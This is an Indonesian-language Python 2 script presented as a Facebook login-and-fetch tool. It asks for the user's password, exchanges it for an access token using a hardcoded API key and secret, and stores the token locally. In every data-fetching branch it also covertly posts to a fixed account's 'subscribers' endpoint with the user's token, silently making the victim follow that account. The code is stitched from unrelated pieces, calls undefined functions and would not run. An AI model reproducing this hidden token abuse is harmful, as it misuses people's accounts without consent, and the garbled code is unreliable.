#!/usr/bin/facebook/sanbook/nguyen
#
# Copyright 2010 Facebook
# Copyright 2019 Sanbook
# Author		: Soesanto 
# Program Name	: Nguyen
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0

import os
import sys
import json
import time
import getpass
import hashlib
import requests


def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		exit()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		main()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		main()
# HMAC can only handle ascii (byte) strings
# https://bugs.python.org/issue5285
def id():
	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

	data.update({'sig':x.hexdigest()})
        get(data)

############################################################
def post():
	global token , WT

	try:

		
	  if WT == 'wallpost':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['home']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['home']['data']




	  elif WT == 'me':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']



	  elif WT == 'req':
		print '[*] fetching all friends requests'

		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
		return result['data']



	  elif WT == 'friends':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['friends']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['friends']['data']



	  elif WT == 'subs':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
		return result



	  elif WT == 'albums':
		print '[*] fetching all albums id'

		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['albums']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['albums']['data']



	  else:
		print '[*] fetching all posts id'

		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));
		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']



	except KeyError:
		print '[!] failed to retrieve all post id'
		print '[!] Stopped'
		main()
	except requests.exceptions.ConnectionError:
		print '[!] Connection Error'
		print '[!] Stopped'
		main()
	except KeyboardInterrupt:
		print '\r[!] Stopped                                      '
		main()
		
def postingan_scrap(post):
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
		print('List Postingan Kamu')
    		print(post["created_time"])
    		print(post['message'])
# You'll need an access token here to do anything.  You can get a temporary one
# here: https://developers.facebook.com/tools/explorer/
		access_token = "token"
		user = "me"
# Look at 'me' profile for this example by using his Facebook id.
		graph = facebook.GraphAPI(access_token)
		profile = graph.get_object(user)
		posts = graph.get_connections(profile["id"], "posts")
# Wrap this block in a while loop so we can keep paginating requests until
# finished.
while True:
    try:
        # Perform some action on each post in the collection we receive from
        # Facebook.
        [postingan_scrap(post=post) for post in posts["data"]]
        # Attempt to make a request to the next page of data, if it exists.
        posts = requests.get(posts["paging"]["next"]).json()
    except KeyError:
        # When there are no more pages (['paging']['next']), break from the
        # loop and end the script.
        break
######################################3


def main():
    print "\n"
    print "----------- MENU ----------"
    print "[Login] [Logout] [Program]"
    print "\n   [Update] [Exit]"
    
    main = raw_input("PILIH MENU> ")
    print "\n"

    if main == 1:
        id()
    elif main == 2:
        postingan_scrap()
    elif main == 3:
        delete_post()
    elif main == 4:
        exit()
    else:
        print "Salah pilih!"


if __name__ == "__main__":

    while(True):
        menu()
